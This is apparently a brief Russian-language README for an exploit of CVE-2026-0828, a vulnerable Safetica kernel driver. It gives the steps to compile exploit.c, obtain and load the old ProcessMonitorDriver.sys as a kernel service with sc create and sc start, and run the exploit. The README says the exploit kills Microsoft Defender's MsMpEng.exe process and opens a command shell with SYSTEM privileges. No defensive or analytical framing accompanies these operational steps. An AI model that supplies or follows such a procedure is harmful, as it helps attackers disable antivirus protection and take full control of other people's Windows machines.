# dast
CVE-2026-0828
борка (Build): Откройте Командную строку разработчика Visual Studio (x64 Native Tools) и скомпилируйте код

:
bash

cl.exe /W3 /O1 /nologo exploit.c /Fe:exploit.exe

Подготовка: Убедитесь, что на тестовой машине установлен уязвимый драйвер Safetica (ProcessMonitorDriver.sys). Если его нет, вам нужно будет его раздобыть (например, из дистрибутива Safetica версии < 11.26.19)

.

Загрузка драйвера (от имени Администратора): Драйвер должен быть загружен в систему. Это можно сделать через консоль с правами администратора

:
bash

sc create STProcessMonitor type= kernel binPath= "C:\full\path\to\ProcessMonitorDriver.sys"
sc start STProcessMonitor

Запуск эксплойта: Теперь запустите exploit.exe. Он завершит указанный процесс (в коде это MsMpEng.exe) и откроет новое окно cmd.exe с правами NT AUTHORITY\SYSTEM
